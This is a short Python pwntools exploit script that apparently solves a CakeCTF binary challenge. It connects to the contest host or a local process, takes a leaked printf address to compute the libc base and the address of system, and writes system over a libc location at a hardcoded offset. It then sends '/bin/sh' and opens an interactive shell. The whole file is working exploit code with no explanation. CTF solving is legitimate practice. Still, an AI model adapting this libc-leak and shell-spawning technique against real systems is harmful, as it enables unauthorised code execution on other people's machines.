#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.cakectf.com"
PORT = 9003
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

libc = ELF('./libc-2.31.so')
off_printf = libc.symbols["printf"]
off_system = libc.symbols["system"]

def exploit():
	conn.recvuntil(" = ")
	addr_main = int(conn.recvline(),16)
	conn.recvuntil(" = ")
	libc_printf = int(conn.recvline(),16)

	libc_base = libc_printf - off_printf
	libc_system = libc_base + off_system
	print(hex(libc_base))
	test = libc_base + (0x7ffff7fb20a8 - 0x7ffff7dc7000)
	conn.sendlineafter(": ", hex(test))
	conn.sendlineafter(": ", hex(libc_system))
	conn.sendlineafter(": ", "/bin/sh")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
